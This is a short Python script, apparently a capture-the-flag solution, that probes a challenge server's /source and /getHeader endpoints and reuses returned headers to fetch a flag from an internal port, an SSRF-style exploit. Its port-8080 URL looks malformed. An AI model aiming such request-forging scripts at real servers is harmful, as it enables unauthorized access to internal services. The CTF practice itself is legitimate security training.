#!/usr/bin/python3

import requests
import json

# Initial recon

# url = "http://138.68.36.145/"
# r = requests.get(url)
# print(r.text)

# GET /source

# url = "http://138.68.36.145/source?view=true"
# r = requests.get(url)
# print(r.text)

# POST /getHeader

url = "http://138.68.36.145/getHeader"
data = {"url": "http://example.com"}
r_getHeader = requests.post(url, data=data)
print(r_getHeader.text)

# Get flag at :8080

url = "http://138.68.36.145/:8080"
headers = json.loads(r_getHeader.text)
r = requests.post(url, headers=headers)
print(r.text)
